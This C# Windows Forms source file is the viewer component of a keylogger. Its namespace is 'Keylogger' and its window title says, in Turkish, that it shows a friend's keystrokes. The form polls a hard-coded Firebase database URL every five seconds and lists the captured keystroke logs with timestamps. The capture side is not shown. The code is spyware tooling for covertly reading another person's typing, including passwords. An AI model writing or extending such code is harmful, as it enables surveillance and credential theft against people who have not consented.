using System;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Text.Json;

namespace Keylogger
{
    public partial class FirebaseViewer : Form
    {
        private System.Windows.Forms.Timer refreshTimer;
        private TextBox txtReceivedLogs;
        private Label lblStatus;
        private Button btnStart;
        private Button btnStop;
        private Button btnClear;
        private string lastLogId = "";
        private bool isMonitoring = false;

        public FirebaseViewer()
        {
            InitializeComponent();
            InitializeTimer();
        }

        private void InitializeComponent()
        {
            this.Text = "Firebase Keylog Viewer - Arkadaşının Tuşları";
            this.Size = new System.Drawing.Size(600, 500);
            this.StartPosition = FormStartPosition.CenterScreen;

            // Status label
            lblStatus = new Label();
            lblStatus.Text = "Firebase'den veri bekleniyor...";
            lblStatus.Location = new System.Drawing.Point(12, 12);
            lblStatus.Size = new System.Drawing.Size(400, 23);
            this.Controls.Add(lblStatus);

            // Start button
            btnStart = new Button();
            btnStart.Text = "İzlemeyi Başlat";
            btnStart.Location = new System.Drawing.Point(12, 45);
            btnStart.Size = new System.Drawing.Size(120, 30);
            btnStart.Click += BtnStart_Click;
            this.Controls.Add(btnStart);

            // Stop button
            btnStop = new Button();
            btnStop.Text = "Durdur";
            btnStop.Location = new System.Drawing.Point(140, 45);
            btnStop.Size = new System.Drawing.Size(80, 30);
            btnStop.Click += BtnStop_Click;
            btnStop.Enabled = false;
            this.Controls.Add(btnStop);

            // Clear button
            btnClear = new Button();
            btnClear.Text = "Temizle";
            btnClear.Location = new System.Drawing.Point(230, 45);
            btnClear.Size = new System.Drawing.Size(80, 30);
            btnClear.Click += BtnClear_Click;
            this.Controls.Add(btnClear);

            // Received logs textbox
            txtReceivedLogs = new TextBox();
            txtReceivedLogs.Multiline = true;
            txtReceivedLogs.ScrollBars = ScrollBars.Vertical;
            txtReceivedLogs.Location = new System.Drawing.Point(12, 85);
            txtReceivedLogs.Size = new System.Drawing.Size(560, 350);
            txtReceivedLogs.ReadOnly = true;
            txtReceivedLogs.Font = new System.Drawing.Font("Consolas", 10);
            this.Controls.Add(txtReceivedLogs);
        }

        private void InitializeTimer()
        {
            refreshTimer = new System.Windows.Forms.Timer();
            refreshTimer.Interval = 5000; // 5 saniyede bir kontrol et
            refreshTimer.Tick += RefreshTimer_Tick;
        }

        private async void RefreshTimer_Tick(object sender, EventArgs e)
        {
            if (isMonitoring)
            {
                await CheckForNewLogs();
            }
        }

        private async Task CheckForNewLogs()
        {
            try
            {
                string firebaseUrl = "https://deneme-6195c-default-rtdb.firebaseio.com/logs.json";
                
                using (HttpClient client = new HttpClient())
                {
                    var response = await client.GetAsync(firebaseUrl);
                    if (response.IsSuccessStatusCode)
                    {
                        string jsonResponse = await response.Content.ReadAsStringAsync();
                        
                        if (!string.IsNullOrEmpty(jsonResponse) && jsonResponse != "null")
                        {
                            ProcessFirebaseData(jsonResponse);
                            lblStatus.Text = $"Son güncelleme: {DateTime.Now:HH:mm:ss}";
                        }
                        else
                        {
                            lblStatus.Text = "Firebase'de henüz veri yok...";
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                lblStatus.Text = $"Hata: {ex.Message}";
            }
        }

        private void ProcessFirebaseData(string jsonData)
        {
            try
            {
                using (JsonDocument doc = JsonDocument.Parse(jsonData))
                {
                    foreach (JsonProperty logEntry in doc.RootElement.EnumerateObject())
                    {
                        string logId = logEntry.Name;
                        
                        // Yeni log mu kontrol et
                        if (string.Compare(logId, lastLogId) > 0)
                        {
                            if (logEntry.Value.TryGetProperty("timestamp", out JsonElement timestampElement) &&
                                logEntry.Value.TryGetProperty("content", out JsonElement contentElement))
                            {
                                string timestamp = timestampElement.GetString();
                                string content = contentElement.GetString();
                                
                                // Yeni log'u ekle
                                string newLogLine = $"[{timestamp}] {content}\r\n";
                                txtReceivedLogs.AppendText(newLogLine);
                                txtReceivedLogs.ScrollToCaret();
                                
                                lastLogId = logId;
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                lblStatus.Text = $"JSON parse hatası: {ex.Message}";
            }
        }

        private void BtnStart_Click(object sender, EventArgs e)
        {
            isMonitoring = true;
            refreshTimer.Start();
            btnStart.Enabled = false;
            btnStop.Enabled = true;
            lblStatus.Text = "İzleme başlatıldı...";
        }

        private void BtnStop_Click(object sender, EventArgs e)
        {
            isMonitoring = false;
            refreshTimer.Stop();
            btnStart.Enabled = true;
            btnStop.Enabled = false;
            lblStatus.Text = "İzleme durduruldu.";
        }

        private void BtnClear_Click(object sender, EventArgs e)
        {
            txtReceivedLogs.Clear();
            lblStatus.Text = "Loglar temizlendi.";
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                refreshTimer?.Dispose();
            }
            base.Dispose(disposing);
        }
    }
}